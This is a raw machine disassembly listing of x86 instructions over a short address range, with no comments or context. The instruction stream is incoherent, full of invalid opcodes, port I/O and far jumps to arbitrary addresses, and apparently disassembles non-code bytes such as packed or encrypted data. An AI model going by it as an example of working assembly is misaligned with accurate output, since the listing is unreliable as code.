  40858c:	push   0xffffffb9
  40858e:	in     eax,0x7b
  408590:	add    DWORD PTR [ebx],esp
  408592:	or     al,0x9a
  408594:	les    ebx,FWORD PTR [ecx+0x3]
  408597:	push   0x7b
  408599:	dec    esi
  40859a:	shl    bl,0xa2
  40859d:	cdq    
  40859e:	push   edx
  40859f:	call   0x6ae2:0xe916ed9
  4085a6:	shl    DWORD PTR [ebp+0x236ce3b],cl
  4085ac:	daa    
  4085ad:	and    esp,DWORD PTR [esi+ecx*1-0x4effa02e]
  4085b4:	pop    ecx
  4085b5:	jb     0x4085a0
  4085b7:	cdq    
  4085b8:	leave  
  4085b9:	lea    edi,[ebp+0x70]
  4085bc:	or     eax,0x9d211f54
  4085c1:	shl    BYTE PTR [esi+0x32],0x5e
  4085c5:	or     BYTE PTR [ebx-0x7],bl
  4085c8:	xchg   esi,eax
  4085c9:	shl    DWORD PTR [edi+0x67],cl
  4085cc:	jns    0x40863f
  4085ce:	xchg   bl,dl
  4085d0:	push   esp
  4085d1:	loopne 0x408565
  4085d3:	or     ebp,DWORD PTR [ecx+0x34]
  4085d6:	ja     0x40861b
  4085d8:	retfw  0x131e
  4085dc:	pop    es
  4085dd:	stos   BYTE PTR es:[edi],al
  4085de:	and    BYTE PTR [edi-0x3af64fc2],dh
  4085e4:	add    BYTE PTR [ebx+0xe923a16],ch
  4085ea:	jmp    0xa7114b35
  4085ef:	pop    ds
  4085f0:	cmp    ah,dh
  4085f2:	xor    dl,BYTE PTR cs:[ebx-0x4334e306]
  4085f9:	adc    BYTE PTR [eax],cl
  4085fb:	ds jl  0x4085e9
  4085fe:	or     ebx,ebx
  408600:	in     al,dx
  408601:	frstor [esi-0x20]
  408604:	pop    ds
  408605:	retf   
  408606:	inc    ebp
  408607:	sub    al,0xf5
  408609:	ins    BYTE PTR es:[edi],dx
  40860a:	jge    0x408629
  40860c:	(bad)  
  40860d:	jmp    0x2fc5a2cc
  408612:	xor    al,0x27
  408614:	inc    ebp
  408615:	and    DWORD PTR [eax-0x66],esp
  408618:	loope  0x40865d
  40861a:	sub    ebx,DWORD PTR [esi+0x6b82e44a]
  408620:	xchg   esp,eax
  408621:	pop    eax
  408622:	test   ebp,ecx
  408624:	(bad)  
  408625:	or     ebp,ebx
  408627:	sub    al,0xf3
  408629:	xchg   ecx,eax
  40862a:	xchg   ebx,eax
  40862b:	retf   
  40862c:	jecxz  0x4086a4
  40862e:	imul   eax,DWORD PTR [ebx+ecx*8-0x32d5889f],0x20
  408636:	xchg   ebx,eax
  408637:	jecxz  0x4085fc
  408639:	sbb    BYTE PTR [edx+0x2e7e8198],ch
  40863f:	hlt    
  408640:	and    bh,BYTE PTR [ecx]
  408642:	loop   0x40869b
  408644:	and    eax,0xe16978a9
  408649:	hlt    
  40864a:	add    DWORD PTR [ebp+0x47221f78],edx
  408650:	stos   DWORD PTR es:[edi],eax
  408651:	xor    DWORD PTR [ecx-0x4],eax
  408654:	cmp    al,0xce
  408656:	cmp    bl,BYTE PTR [edi-0x4f51e34d]
  40865c:	sbb    BYTE PTR [ecx],bh
  40865e:	sub    DWORD PTR [ebp-0x59264133],0x1e7389b8
  408668:	daa    
  408669:	(bad)  
  40866a:	mov    ch,0x4a
  40866c:	adc    ebp,ebp
  40866e:	sbb    ebx,DWORD PTR [ebp+0x1538c25d]
  408674:	xchg   DWORD PTR [eax+0x13545874],ecx
  40867a:	imul   edx,ebx,0xffffffb0
  40867d:	add    DWORD PTR es:[ebx],ebp
  408680:	mov    esi,0xeb71a705
  408685:	stc    
  408686:	cmp    al,0x96
  408688:	sti    
  408689:	das    
  40868a:	fwait
  40868b:	sbb    al,0x61
  40868d:	xchg   esi,eax
  40868f:	mov    dh,0x85
  408691:	xchg   esp,eax
  408692:	cld    
  408693:	push   0x88ea0273
  408698:	jg     0x40868e
  40869a:	cs xchg ebx,eax
  40869c:	xor    ebp,DWORD PTR [edx+0x16]
  40869f:	jae    0x4086b0
  4086a1:	and    bl,0xd9
  4086a4:	mov    esi,0x93706ec4
  4086a9:	cwde   
  4086aa:	add    BYTE PTR [ecx],bl
  4086ac:	ret    
  4086ad:	sti    
  4086ae:	mov    ebx,0x3ac0a454
  4086b3:	fld    TBYTE PTR [edi+0x28672149]
  4086b9:	les    edi,FWORD PTR [ecx-0x2a]
  4086bc:	int    0x41
  4086be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086bf:	test   DWORD PTR [edx+esi*2],0x3c2f1b52
  4086c6:	arpl   WORD PTR [esi+0x19ee1b22],cx
  4086cc:	das    
  4086cd:	outs   dx,BYTE PTR ds:[esi]
  4086ce:	xor    dh,BYTE PTR [ecx+0x34]
  4086d1:	loopne 0x4086fd
  4086d3:	clc    
  4086d4:	or     ecx,esp
  4086d6:	jo     0x408742
  4086d8:	(bad)  
  4086d9:	xchg   esp,eax
  4086da:	and    DWORD PTR ds:0x4846135d,0x7358f98
  4086e4:	adc    eax,0xef747530
  4086e9:	inc    ecx
  4086ea:	add    DWORD PTR [edi],edi
  4086ec:	jmp    0x4ea3:0xf32ccdf
  4086f3:	mov    DWORD PTR [ebx],ebp
  4086f5:	or     ebx,DWORD PTR [edi]
  4086f7:	pop    ecx
  4086f8:	rcl    BYTE PTR [edx+ebx*1],1
  4086fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086fc:	in     eax,0x57
  4086fe:	stos   DWORD PTR es:[edi],eax
  4086ff:	sbb    al,0xa2
  408701:	mov    edx,0xc61abb7
  408706:	mov    edi,0xf649fddf
  40870b:	push   ds
  40870c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40870d:	jp     0x4086bd
  40870f:	popf   
  408710:	lahf   
  408711:	in     al,dx
  408712:	sbb    cl,0x95
  408715:	bound  esp,QWORD PTR [ecx-0x6c7044b4]
  40871b:	sub    edi,edi
  40871d:	(bad)  
  40871e:	daa    
  40871f:	add    cl,0xd8
  408722:	pushf  
  408723:	loopne 0x408766
  408725:	stos   DWORD PTR es:[edi],eax
  408726:	xor    al,BYTE PTR [eax+0x19]
  408729:	in     eax,dx
  40872a:	stc    
  40872b:	cmp    DWORD PTR [esi+0x1f],edx
  40872e:	(bad)  
  40872f:	push   edi
  408730:	mov    dh,0x27
  408732:	cmp    BYTE PTR [edx+0x37],dh
  408735:	xlat   BYTE PTR ds:[ebx]
  408736:	repnz popf 
  408738:	jmp    0x49c7:0x737421f3
  40873f:	push   eax
  408740:	or     BYTE PTR [edi],dl
  408742:	jmp    0x408740
  408744:	scas   al,BYTE PTR es:[edi]
  408745:	out    0xf3,eax
  408747:	out    0x62,eax
  408749:	clc    
  40874a:	and    eax,0x4211ffcb
  40874f:	sbb    esp,edx
  408751:	fisubr DWORD PTR [ebx-0x53a92245]
  408757:	repnz dec esp
  408759:	leave  
  40875a:	(bad)  
  40875b:	dec    ebp
  40875c:	nop
  40875d:	dec    edx
  40875e:	jno    0x4087a4
  408760:	jne    0x408714
  408762:	addr16 lock mov ds:0x91aa,al
  408767:	sbb    BYTE PTR [ebx+0x68b64999],bh
  40876d:	retf   0xb739
  408770:	jne    0x40876b
  408772:	mov    ecx,0x2e3bab28
  408777:	stos   DWORD PTR es:[edi],eax
  408778:	xlat   BYTE PTR ds:[ebx]
  408779:	cdq    
  40877a:	ror    DWORD PTR [eax],1
  40877c:	mov    ch,0xf0
  40877e:	div    DWORD PTR [ebx-0x3e]
  408781:	sub    eax,0xa8b2b2d2
  408786:	pop    ebp
  408787:	jle    0x408780
  408789:	(bad)  
  40878a:	je     0x4087b3
  40878c:	sbb    eax,0x95ff89d3
  408791:	jns    0x40878c
  408793:	mov    ah,0x61
  408795:	aad    0x7e
  408797:	sbb    bl,ch
  408799:	adc    BYTE PTR [edx-0x22],ch
  40879c:	(bad)  
  40879d:	push   esp
  40879e:	sbb    BYTE PTR [ebp+0x55],0xe1
  4087a2:	sbb    ch,BYTE PTR [ebx]
  4087a4:	loopne 0x408756
  4087a6:	(bad)  
  4087a7:	in     eax,0x14
  4087a9:	pushf  
  4087aa:	inc    esi
  4087ab:	out    dx,al
  4087ac:	mov    dh,0x8e
  4087ae:	jge    0x4087a1
  4087b0:	sbb    BYTE PTR [esp+ecx*4-0x4345a473],dh
  4087b7:	sbb    eax,0x762eec18
  4087bc:	sub    BYTE PTR [ebx+ebx*1-0xc],al
  4087c0:	lea    ebx,[edx]
  4087c2:	(bad)  
  4087c3:	dec    eax
  4087c4:	fisttp DWORD PTR cs:[edx-0x56]
  4087c8:	cmp    al,0x9c
  4087ca:	das    
  4087cb:	fldenv [ecx-0x17]
  4087ce:	fs stos DWORD PTR es:[edi],eax
  4087d0:	ret    
  4087d1:	jns    0x4087cc
  4087d3:	test   DWORD PTR [ebx+eiz*2],edx
  4087d6:	xor    BYTE PTR [eax-0x241c2c92],bl
  4087dc:	xchg   ecx,esi
  4087de:	ret    0x152c
  4087e1:	popa   
  4087e2:	dec    ebx
  4087e3:	imul   esi,ecx,0xffffffcd
  4087e6:	popf   
  4087e7:	sbb    esi,eax
  4087e9:	pop    edi
  4087ea:	jmp    0x9ce2fc89
  4087ef:	xlat   BYTE PTR ds:[ebx]
  4087f0:	xchg   edx,eax
  4087f1:	inc    edx
  4087f2:	push   0x7fc95ecb
  4087f7:	outs   dx,DWORD PTR ds:[esi]
  4087f8:	icebp  
  4087f9:	pop    edx
  4087fa:	jae    0x4087db
  4087fc:	mov    ebx,0xb3d085e4
  408801:	or     BYTE PTR [eax],bh
  408803:	shr    DWORD PTR [edi],0x4b
  408806:	test   ax,0xacad
  40880a:	pop    edx
  40880b:	mov    dh,0xa9
  40880d:	pop    eax
  40880e:	sub    dl,BYTE PTR [ebp+0x2487c46b]
  408814:	stos   DWORD PTR es:[edi],eax
  408815:	mov    ds,WORD PTR [ecx-0x3c]
  408818:	push   ss
  408819:	adc    BYTE PTR [ebp-0x431c616f],bh
  40881f:	ret    0xf242
  408822:	ins    BYTE PTR es:[edi],dx
  408823:	or     eax,0x5435a8fd
  408828:	add    ah,cl
  40882a:	add    dh,BYTE PTR [edi-0x86881c2]
  408830:	call   0x7f3d:0x47846ba7
  408837:	clc    
  408838:	(bad)  
  408839:	mov    al,0x5d
  40883b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40883c:	xor    BYTE PTR [eax+0x512fe0a3],ah
  408842:	test   DWORD PTR [eax],0xb0682419
  408848:	mov    bl,0x6b
  40884a:	(bad)  
  40884b:	rcr    BYTE PTR [esi],1
  40884d:	add    ebp,edx
  40884f:	rol    DWORD PTR ss:[esi+0x19c1ddff],1
  408856:	popf   
  408857:	inc    DWORD PTR [eax-0x263b9672]
  40885d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40885e:	inc    ebx
  40885f:	sub    BYTE PTR [ecx+0x7cb1d453],ah
  408865:	adc    ebx,DWORD PTR [eax]
  408867:	mov    cl,0x42
  408869:	js     0x40886f
  40886b:	adc    cl,dh
  40886d:	sbb    BYTE PTR ds:0x37e41567,al
  408873:	iret   
  408874:	jge    0x408887
  408876:	sar    BYTE PTR [ecx],1
  408878:	mov    fs,WORD PTR [edx+0x4d]
  40887b:	imul   BYTE PTR [eax+0x648ab3b2]
  408881:	xchg   esp,esi
  408883:	ret    
  408884:	xchg   ebx,eax
  408885:	ds add al,0x67
  408888:	cmp    ecx,DWORD PTR [ecx-0x2b5bfa60]
  40888e:	sti    
  40888f:	xor    BYTE PTR [eax-0x54],0x9f
  408893:	(bad)  
  408894:	jl     0x408858
  408896:	ins    DWORD PTR es:[edi],dx
  408897:	cmp    dh,BYTE PTR [ecx]
  408899:	xor    DWORD PTR [ecx-0x29008be3],esp
  40889f:	fcmovnbe st,st(2)
  4088a1:	mov    eax,ds:0x46a99c5e
  4088a6:	pop    ss
  4088a7:	mov    bh,0x39
  4088a9:	dec    ecx
  4088aa:	rcl    BYTE PTR [eax+0x7e],cl
  4088ad:	nop
  4088ae:	ds mov ebp,0x3e715857
  4088b4:	jo     0x4088cd
  4088b6:	gs jne 0x408905
  4088b9:	fld    TBYTE PTR [ebx]
  4088bb:	in     al,dx
  4088bc:	pop    edi
  4088bd:	jmp    0x276e:0xdc80aa78
  4088c4:	push   esp
  4088c5:	mov    dl,0xa7
  4088c7:	push   ebp
  4088c8:	leave  
  4088c9:	fld    TBYTE PTR [edx+edx*8]
  4088cc:	repnz dec edx
  4088ce:	pop    ebp
  4088cf:	test   DWORD PTR [edx-0x74],0x7e01bef5
  4088d6:	fld    st(4)
  4088d8:	fld    QWORD PTR [edx-0x41]
  4088db:	in     al,0xfe
  4088dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088de:	push   0x68
  4088e0:	rcr    edi,cl
  4088e2:	fiadd  WORD PTR [ecx]
  4088e4:	test   DWORD PTR ds:0x3f2ecfae,0x1b106d6c
  4088ee:	jae    0x4088fb
  4088f0:	aam    0xed
  4088f2:	clc    
  4088f3:	mov    al,ds:0xc984f753
  4088f8:	sub    DWORD PTR [edi+0x4a7c062e],edi
  4088fe:	jge    0x408915
  408900:	xlat   BYTE PTR ds:[ebx]
  408901:	or     edi,DWORD PTR [eax+ecx*4]
  408904:	(bad)  
  408906:	xchg   edx,eax
  408907:	ret    0x31c6
  40890a:	xchg   ecx,eax
  40890b:	xor    BYTE PTR ds:0x49d16a2a,0xaa
  408912:	in     al,dx
  408913:	test   DWORD PTR [ecx-0xe],ebx
  408916:	sub    DWORD PTR [esi],0x52
  408919:	jns    0x408933
  40891b:	lea    ebp,[esp+edi*8]
  40891e:	xchg   edi,eax
  40891f:	mov    eax,ds:0xc847431b
  408924:	aad    0x59
  408926:	sub    esp,DWORD PTR ds:0xa6b81744
  40892c:	cmp    DWORD PTR [esi+0x29],esi
  40892f:	pop    eax
  408930:	xor    al,0xd7
  408932:	test   BYTE PTR [ebp-0x54189507],0xa8
  408939:	out    0xdb,eax
  40893b:	pop    ds
  40893c:	out    dx,al
  40893d:	mov    cl,0x14
  40893f:	inc    edi
  408940:	fld    st(4)
  408942:	fnstsw WORD PTR [eax-0x71]
  408945:	mov    esi,0x63758ffa
  40894a:	out    dx,eax
  40894b:	ds xor ebp,0x271ce53f
  408952:	jecxz  0x408943
  408954:	inc    esi
  408955:	lock push ebx
  408957:	and    al,0x2b
  408959:	dec    edi
  40895a:	mov    ebx,0x60a0646d
  40895f:	sbb    dl,BYTE PTR [edi-0x1b]
  408962:	scas   al,BYTE PTR es:[edi]
  408963:	arpl   WORD PTR [ecx+ebp*4-0x6e],bx
  408967:	sub    DWORD PTR [ecx-0x1bdbf853],0x7c8f1bac
  408971:	js     0x4089a2
  408973:	mov    eax,ds:0x5791ecd7
  408978:	mov    ds:0x18bbdc2d,al
  40897d:	push   edi
  40897e:	sbb    eax,0xb98da666
  408983:	pusha  
  408984:	xchg   DWORD PTR [ebp-0x5c],esp
  408987:	(bad)  
  408988:	call   0x9f99:0xb8af294a
  40898f:	je     0x408a02
  408991:	xor    al,BYTE PTR [esi-0x4ce8b0bb]
  408997:	es daa 
  408999:	dec    esi
  40899a:	mov    esi,0x2eacffc
  40899f:	test   al,0xb0
  4089a1:	cmp    eax,edi
  4089a3:	jmp    0xafa8:0xdf8e94e1
  4089aa:	and    DWORD PTR [ebp+0x4466b864],eax
  4089b0:	rcl    DWORD PTR [ecx],1
  4089b2:	mov    edi,0xd2e58f60
  4089b7:	loopne 0x408958
  4089b9:	ins    DWORD PTR es:[edi],dx
  4089ba:	daa    
  4089bb:	frstor [edi+0x3fe03193]
  4089c1:	imul   esi,DWORD PTR [eax+edi*4-0x26],0xffffff87
  4089c6:	xchg   ebp,eax
  4089c7:	in     al,0xdf
  4089c9:	mov    al,0x1e
  4089cb:	mov    al,ds:0x958e7a9b
  4089d0:	retf   
  4089d1:	sub    al,0x4d
  4089d3:	mov    ah,ah
  4089d5:	repz jg 0x408a45
  4089d8:	rcr    BYTE PTR [esi+0x5c],cl
  4089db:	aaa    
  4089dc:	ins    BYTE PTR es:[edi],dx
  4089dd:	iret   
  4089de:	(bad)  
  4089df:	sbb    dh,BYTE PTR [eax-0x59]
  4089e2:	push   eax
  4089e3:	push   eax
  4089e4:	in     eax,dx
  4089e5:	and    al,0x19
  4089e7:	push   cs
  4089e8:	dec    esi
  4089e9:	inc    eax
  4089ea:	or     eax,0xaf019f79
  4089ef:	ja     0x40898f
  4089f1:	jmp    0x7b7b:0x53054ba1
  4089f8:	fisttp QWORD PTR [ecx+0x5de5a3de]
  4089fe:	(bad)  
  4089ff:	icebp  
  408a00:	(bad)  
  408a01:	lahf   
  408a02:	push   edx
  408a03:	push   cs
  408a04:	pusha  
  408a05:	(bad)  
  408a06:	sbb    eax,ecx
  408a08:	ret    0x1f63
  408a0b:	popf   
  408a0c:	add    bl,bl
  408a0e:	mov    dh,0x6e
  408a10:	cs ss ds push eax
  408a14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a15:	(bad)  
  408a16:	out    0xc8,al
  408a18:	dec    edx
  408a19:	icebp  
  408a1a:	push   edi
  408a1b:	cdq    
  408a1c:	aad    0xb0
  408a1e:	ror    edi,1
  408a20:	push   ebp
  408a21:	pop    ecx
  408a22:	mov    esp,0xe2da8d58
  408a27:	aad    0xc4
  408a29:	es mov ebp,0x50296a98
  408a2f:	gs (bad) 
  408a31:	or     ch,BYTE PTR fs:[edx-0x50]
  408a35:	(bad)  
  408a36:	(bad)  
  408a37:	push   edx
  408a38:	leave  
  408a39:	add    ch,BYTE PTR [esi-0x667a5e60]
  408a3f:	les    ecx,FWORD PTR [edi]
  408a41:	arpl   WORD PTR [ebp-0x38b83dac],sp
  408a47:	loop   0x408a67
  408a49:	test   bh,dh
  408a4b:	cmp    ch,BYTE PTR [ebp+0x12670503]
  408a51:	mov    eax,esp
  408a53:	pop    esp
  408a54:	or     eax,0x6496b786
  408a59:	xchg   ebx,eax
  408a5a:	sbb    DWORD PTR [eax-0x2b0a9349],edx
  408a60:	inc    ebp
  408a61:	pushf  
  408a62:	cld    
  408a63:	je     0x408a86
  408a65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a66:	fs std 
  408a68:	call   0xa1a1ef65
  408a6d:	adc    ecx,eax
  408a6f:	sub    ecx,0xa3ca48e4
  408a75:	popa   
  408a76:	(bad)  
  408a77:	and    eax,0x50ce915e
  408a7c:	mov    ah,0x25
  408a7e:	mov    ebp,0x451151ff
  408a83:	daa    
  408a84:	xchg   BYTE PTR [eax-0x65],dh
  408a87:	ins    BYTE PTR es:[edi],dx
  408a88:	out    dx,al
  408a89:	push   es
  408a8a:	adc    eax,0x26fb2a3d
  408a8f:	push   edi
  408a90:	xchg   edi,eax
  408a91:	mov    dh,0xe7
  408a93:	out    dx,eax
  408a94:	stos   BYTE PTR es:[edi],al
  408a95:	lods   al,BYTE PTR ds:[esi]
  408a96:	xor    BYTE PTR [ecx-0x48],dl
  408a99:	test   eax,0x68f46bca
  408a9e:	out    dx,al
  408a9f:	lahf   
  408aa0:	sbb    bl,BYTE PTR [esi-0x618d1ee8]
  408aa6:	shl    al,1
  408aa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408aa9:	push   es
  408aaa:	inc    edi
  408aab:	add    BYTE PTR [edx],al
  408aad:	or     DWORD PTR [ecx],ebx
  408aaf:	daa    
  408ab0:	out    dx,eax
  408ab1:	(bad)  
  408ab2:	mov    edx,0xab8a870c
  408ab7:	mov    al,ds:0xb181c0dd
  408abc:	call   0xf17c:0x6861f0ef
  408ac3:	test   esp,ecx
  408ac5:	push   es
  408ac6:	or     dl,BYTE PTR [ecx-0x360db5e]
  408acc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408acd:	cwde   
  408ace:	jo     0x408ae6
  408ad0:	xor    DWORD PTR [eax+0x58],0x46
  408ad4:	ds push 0x33
  408ad7:	mov    edi,0x6f94c3da
  408adc:	mov    bh,0xc2
  408ade:	cli    
  408adf:	rcr    BYTE PTR [ebx],cl
  408ae1:	pop    ss
  408ae2:	sar    DWORD PTR [ecx-0x71c81e9c],cl
  408ae8:	adc    eax,DWORD PTR [edx]
  408aea:	add    al,0x2d
  408aec:	call   0x2eba4188
  408af1:	and    esp,DWORD PTR [esi]
  408af3:	sbb    DWORD PTR [esi],ebp
  408af5:	jg     0x408b55
  408af7:	aad    0x67
  408af9:	outs   dx,DWORD PTR ds:[esi]
  408afa:	loopne 0x408ab5
  408afc:	sbb    DWORD PTR [ebx+eiz*4+0x1a7295bb],esp
  408b03:	aaa    
  408b04:	mov    eax,ds:0x782e22f6
  408b09:	fwait
  408b0a:	push   edx
  408b0b:	into   
  408b0c:	fstp   TBYTE PTR [eax-0x74]
  408b0f:	pop    ecx
  408b10:	aaa    
  408b11:	lea    ebp,[ebx]
  408b13:	push   ebp
  408b14:	jno    0x408b56
  408b16:	mov    edi,0xf6774eac
  408b1b:	movsx  ebx,BYTE PTR [edx]
  408b1e:	imul   edi,ecx,0xb6f0e3a3
  408b24:	and    ah,bl
  408b26:	cmp    BYTE PTR [esi],cl
  408b28:	cmp    BYTE PTR [edi-0x5b129765],bh
  408b2e:	rol    BYTE PTR [esi-0x3],cl
  408b31:	out    0x40,al
  408b33:	pop    edx
  408b34:	sbb    DWORD PTR [edx+edx*2+0x43115368],edx
  408b3b:	push   esi
  408b3c:	mov    ah,0x67
  408b3e:	push   eax
  408b3f:	fcomp  DWORD PTR [ebp-0x2b]
  408b42:	jae    0x408b8f
  408b44:	rcr    DWORD PTR ds:0x326ffe6d,0x45
  408b4b:	int3   
  408b4c:	(bad)  
  408b4d:	fistp  WORD PTR [ebp+0x13ccb346]
  408b53:	xor    al,0xff
  408b55:	pop    ecx
  408b56:	xchg   ecx,eax
  408b57:	mov    ch,0x1
  408b59:	cmp    al,0x8f
  408b5b:	in     eax,0x2a
  408b5d:	data16 cmc 
  408b5f:	adc    al,0x90
  408b61:	repz jg 0x408b08
  408b64:	xchg   esi,edx
  408b66:	fcomip st,st(4)
  408b68:	push   ebx
  408b69:	jo     0x408be9
  408b6b:	js     0x408bad
  408b6d:	pop    eax
  408b6e:	cmp    BYTE PTR [ebx-0x45],dl
  408b71:	jnp    0x408bb2
  408b73:	xchg   ebp,eax
  408b74:	arpl   WORD PTR [edx+0x7],di
  408b77:	in     al,dx
  408b78:	not    eax
  408b7a:	lock aas 
  408b7c:	and    cl,BYTE PTR [ebx+ecx*1-0x6a]
  408b80:	rol    BYTE PTR [esi-0x74],1
  408b83:	jle    0x408b29
  408b85:	mov    eax,0xf03e1392
  408b8a:	dec    esi
  408b8b:	cmp    esi,DWORD PTR [ecx+0x3a]
  408b8e:	sub    ebx,DWORD PTR [edx-0x2e2acf4c]
  408b94:	add    eax,0xa50b4781
  408b99:	adc    DWORD PTR [bx-0x72],ecx
  408b9d:	js     0x408ba9
  408b9f:	lea    esp,ds:0x4064aa94
  408ba5:	add    DWORD PTR [edx-0x60],ecx
  408ba8:	push   cs
  408ba9:	add    dl,BYTE PTR [ebx-0x765e69f]
  408baf:	ss pop ecx
  408bb1:	jae    0x408c13
  408bb3:	mov    ds:0x635cc1d4,al
  408bb8:	xchg   esp,eax
  408bb9:	lods   al,BYTE PTR ds:[esi]
  408bba:	mov    bl,0x75
  408bbc:	add    eax,0x6c2822ae
  408bc1:	pop    esp
  408bc2:	shr    DWORD PTR [esp+ecx*1+0x50],cl
  408bc6:	and    dl,BYTE PTR ds:0xfcf1301e
  408bcc:	dec    edi
  408bcd:	mov    ebp,0x297d18ef
  408bd2:	sar    BYTE PTR [ebx],0xc9
  408bd5:	mov    BYTE PTR ds:0xbcdc484a,ch
  408bdb:	dec    edi
  408bdc:	push   eax
  408bdd:	aam    0x4f
  408bdf:	in     eax,dx
  408be0:	in     al,dx
  408be1:	dec    esp
  408be2:	(bad)  
  408be3:	icebp  
  408be4:	loopne 0x408bd5
  408be6:	sbb    al,0xdd
  408be8:	and    al,0xa
  408bea:	data16 add BYTE PTR [esi+0x6cd607a7],al
  408bf1:	enter  0x227d,0x35
  408bf5:	adc    DWORD PTR [esi+ebp*2-0x54416052],esp
  408bfc:	popf   
  408bfd:	test   al,0x55
  408bff:	push   0x79
  408c01:	jne    0x408c38
  408c03:	add    DWORD PTR [esi],0x40c3755d
  408c09:	mov    esp,0x62daf496
  408c0e:	mov    ch,0x1f
  408c10:	xchg   edx,eax
  408c11:	push   ebp
  408c12:	jno    0x408c60
  408c14:	in     eax,0x7e
  408c16:	sub    ah,BYTE PTR [eax]
  408c18:	iret   
  408c19:	popf   
  408c1a:	push   es
  408c1b:	or     dl,ch
  408c1d:	cmp    eax,0x60f7c02f
  408c22:	and    al,0x78
  408c24:	rcr    DWORD PTR [edx-0x5dacd16a],cl
  408c2a:	xchg   ecx,eax
  408c2c:	shl    BYTE PTR [ebp-0x3d6f29d0],cl
  408c32:	sbb    al,0x2a
  408c34:	cmp    al,0x86
  408c36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c37:	inc    esp
  408c38:	jle    0x408cb1
  408c3a:	dec    esi
  408c3b:	ja     0x408ca4
  408c3d:	and    edi,DWORD PTR [ebp-0x295f1338]
  408c43:	pop    ebx
  408c44:	out    dx,al
  408c45:	add    dh,BYTE PTR [esi-0x12]
  408c48:	sbb    eax,0x66c8b4a7
  408c4d:	cli    
  408c4e:	loop   0x408c89
  408c50:	dec    edi
  408c51:	mov    esp,0x41da9ffb
  408c56:	mov    edx,ebp
  408c58:	fistp  WORD PTR es:[edx-0x2d44f72e]
  408c5f:	mov    esp,0x417fa2e1
  408c64:	and    BYTE PTR [esi+0x8],0x36
  408c68:	cmp    DWORD PTR [edi+0x682a42e],0xc5107b26
  408c72:	aad    0x1e
  408c74:	cmp    dh,BYTE PTR [ebx]
  408c76:	sub    DWORD PTR [esi+edi*4],0x401009eb
  408c7d:	outs   dx,BYTE PTR ds:[esi]
  408c7e:	or     DWORD PTR [ebx],0x48f13f3
  408c84:	retf   
  408c85:	xchg   esp,eax
  408c86:	mov    WORD PTR [ebp+0x43d2b62],ss
  408c8c:	xchg   edx,eax
  408c8d:	jae    0x408c9e
  408c8f:	add    eax,DWORD PTR gs:[ecx]
  408c92:	in     al,0xc7
  408c94:	int    0xb6
  408c96:	or     BYTE PTR [edi-0x537940b5],0x9f
  408c9d:	out    dx,al
  408c9e:	pop    edi
  408c9f:	dec    edx
  408ca0:	cli    
  408ca1:	xor    BYTE PTR [esp+edi*8],bl
  408ca4:	test   al,0xaa
  408ca6:	xor    al,cl
  408ca8:	sbb    dl,ah
  408caa:	sahf   
  408cab:	jae    0x408c94
  408cad:	mov    ds:0x1cb5e52d,eax
  408cb2:	mov    eax,0x9bef5f62
  408cb7:	add    eax,0xf97ed94a
  408cbc:	sbb    BYTE PTR [ebx],dh
  408cbe:	and    al,0x18
  408cc0:	inc    edi
  408cc1:	inc    esi
  408cc2:	mov    edx,0x9f6489ae
  408cc7:	cmp    al,al
  408cc9:	int3   
  408cca:	fucom  st(1)
  408ccc:	push   0xfffffff0
  408cce:	xchg   esp,eax
  408ccf:	lds    esi,FWORD PTR [esi-0x3e]
  408cd2:	das    
  408cd3:	inc    ebp
  408cd4:	clc    
  408cd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cd7:	popf   
  408cd8:	cmp    al,0xd0
  408cda:	dec    esp
  408cdb:	fscale 
  408cdd:	mov    esp,0x4a16afc5
  408ce2:	cmp    dh,0xb4
  408ce5:	sahf   
  408ce6:	(bad)  
  408ce7:	jmp    0xd64b841b
  408cec:	jle    0x408c79
  408cee:	cmp    ch,BYTE PTR [eax-0x2140b69a]
  408cf4:	scas   eax,DWORD PTR es:[edi]
  408cf5:	daa    
  408cf6:	mov    esp,0x9151949a
  408cfb:	ss sub dl,al
  408cfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cff:	push   ebp
  408d00:	push   es
  408d01:	adc    BYTE PTR ss:[edi+eiz*8+0x2fb3d62],ch
  408d09:	dec    ebp
  408d0a:	mov    edi,0x737c21df
  408d0f:	inc    esp
  408d10:	(bad)  
  408d11:	or     BYTE PTR [ebx-0x260004f5],ch
  408d17:	dec    esp
  408d18:	repz pop eax
  408d1a:	out    0x57,eax
  408d1c:	rcl    DWORD PTR [eax],0x11
  408d1f:	and    al,cl
  408d21:	and    al,0x55
  408d23:	add    cl,BYTE PTR [ebp-0x19]
  408d26:	inc    eax
  408d27:	es adc ebx,edx
  408d2a:	add    dl,ah
  408d2c:	fisttp WORD PTR [esi+0x14707030]
  408d32:	data16 fdiv st,st(2)
  408d35:	mov    ds:0x3b051257,eax
  408d3a:	add    dh,BYTE PTR [edi]
  408d3c:	fistp  WORD PTR [esi]
  408d3e:	xor    al,0x14
  408d40:	push   0x3bbf42a7
  408d45:	xchg   ebp,eax
  408d46:	dec    edi
  408d47:	inc    ebx
  408d48:	int    0xe2
  408d4a:	adc    eax,0x5dfcffb
  408d4f:	mov    dh,0xd
  408d51:	jp     0x408dad
  408d53:	ins    BYTE PTR es:[edi],dx
  408d54:	push   esp
  408d55:	test   DWORD PTR [ebp+0x71],ebx
  408d58:	and    DWORD PTR [eax],0xb5c790f5
  408d5e:	(bad)  [ecx+0x2a]
  408d61:	add    DWORD PTR [ecx],esp
  408d63:	jne    0x408dad
  408d65:	cmp    ebp,DWORD PTR [edi]
  408d67:	out    dx,eax
  408d68:	popf   
  408d69:	pop    edi
  408d6a:	mov    esp,0xdc04a30b
  408d6f:	fwait
  408d70:	mov    WORD PTR [edx-0x3408da8e],cs
  408d76:	test   DWORD PTR [esp+ebp*8-0x64d4a3d4],0x52bc2ce
  408d81:	pop    ds
  408d82:	jmp    0x6597:0x5a5a4665
